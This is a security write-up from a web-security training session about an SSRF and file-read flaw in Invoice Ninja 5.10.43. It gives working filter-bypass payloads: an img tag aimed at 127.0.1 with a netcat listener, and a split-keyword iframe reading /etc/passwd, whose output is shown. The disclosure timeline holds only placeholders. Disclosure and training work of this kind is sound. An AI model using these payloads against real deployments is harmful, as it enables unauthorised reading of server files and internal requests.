---
author: "Branko & Laluka"
title: "Invoice Ninja - Server Side Request Forgery"
slug: "invoice-ninja-5.10.43-ssrf-file-read"
date: 2024-12-22
description: "Our writeup is the consequence of the Laluka's mastery and Branko's wish to learn semething new. More of the Laluka's mastery though. It will go through the description and reproduction of our new found vulnerability in invoicing application called Invoice Ninja. It is about the Server Side Request Forgery found during the white box code review session at OffenSkill level 30 training."
---

# Invoice Ninja - Server Side Request Forgery

## Introduction

This class was focused on white-box code review of Invoice Ninja.\
Invoice Ninja is a Larvel based invoicing software found here [Invoice Ninja](https://invoiceninja.com/).\
The source code is available in their [Invoice Ninja Github](https://github.com/invoiceninja/invoiceninja), and the version we have had a chance to rest is `Invoice Ninja:5.10.43`.

The application creators are introducing their product as follows:

> A source-available invoice, quote, project and time-tracking app built with Laravel.

In this writeup we'll cover a two stories of a full read Server Side Request Forgery.\
One is providing us with outbound connections and the othervone is allowing us to read internal files.\

## Server Side Request Forgery

### Vulnerability details

Our Docker based lab was a training bed for our new found Server Side Request Forgery vulnerability. Server Side Request Forger is allowing us to read almost all internal file and make outbound connections as well. I say almost, as we have the limitation in reading /proc/self/environ and /etc/shadow. As for /proc/self/environ this seems to be problem in Headless Chrome, which is our rendering machine. And /etc/shadow, well one needs to be a root user on any Linux Kernel based machine to read it anyhow. So apart from those two, our SSRF is reaching any file wewish and any external IP address / Host.

### Walkthrough

I will start with the introduction to the part of our new found vulnerability where potential attacker can make outbound connections to external hosts. 

If we create a new invoice and open it in the editing mode, navigate to text editor and click "source code" button. We should be able to edit the invoice in HTML mode. 

<img class="img_full" src="/offenskill/invoice-ninja-5.10.43-ssrf-file-read/1.png" alt="Screenshot of Invoice Ninja Invoice editor">

From there we can try add a payload like this:

`<img src="http://127.0.0.1:8000/" alt="W3Schools.com">`

<img class="img_full" src="/offenskill/invoice-ninja-5.10.43-ssrf-file-read/2.png" alt="Screenshot of Invoice Ninja Invoice editor">

and in our terminal open the connection with netcat like this:

nc -lnvp 8000 -s 127.0.0.1

We wouldn't get too far. The reason is that Invoice Ninja has a security measure which will block our inital attempt and wipe down our payload.

The reason lays in this pice of code:

str_ireplace(['file:/', 'iframe', '<object', '127.0.0.1', 'localhost'], '', $html);

By looking in to it, we can say that it's time to create a bit different payload and go around that security measure. By creating a payload, which looks like this:

`<img src="http://127.0.1:8000/" alt="W3Schools.com">`

and by saving the invoice. Invoice Ninja will make the callback to our Netcat listener. 

<img class="img_full" src="/offenskill/invoice-ninja-5.10.43-ssrf-file-read/3.png" alt="Screenshot of Invoice Ninja connecting to our Netcat listener">

From this point I would jump staright to the other part of Invoice Ninja and explain how would a potential attacker be able to read the internal files.

If we navigate to "Settings" , then "Invoice design" , then "Custom designs" and click on "Design". Choose "Body" and replace the body html code with our Proof of Concept code:

`AA<ifriframeame  style="background: #FFFFFF; position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"  width="1000" height="1000" src="fifile:/le:///etc/passwd/"/>BB`

<img class="img_full" src="/offenskill/invoice-ninja-5.10.43-ssrf-file-read/5.png" alt="Screenshot of Invoice Ninja Invoice Settings">

A short input about our PoC is following. If we would have formed our Proof of Concept like this:

`AA<iframe  style="background: #FFFFFF; position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"  width="1000" height="1000" src="file:///etc/passwd/"/>BB`

the security measure inculded in Invoice Ninja would strip our PoC down and we wouldn't be able to read any files. But if we change iframe to ifriframeame and `file:///etc/passwd/`.

to `fifile:/le:///etc/passwd/` we will mitigate the Invoice Ninja security and have a full file read. So by requesting `fifile:/le:///etc/passwd/` the application will

throw out the contents of a passwd file without any problems and looks as nice as this:

```text
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
www-data:x:82:82:Linux User,,,:/home/www-data:/sbin/nologin
invoiceninja:x:1500:1500::/var/www/app:/bin/sh
```

A true eye candy for every Security Ninjah. :)

## Timeline

- ??/??/???? - Initial contact with `invoice-ninja-security@invoice-ninja.com`
- ??/??/???? - foo
- ??/??/???? - bar

## Credits : Training lvl-30 | 2024 October

Attendees:

- Branko Brkic / [@brank0x42](https://twitter.com/brank0x42)

> Join the next Web Security Trainings at [Offenskill](https://offenskill.com/trainings/)
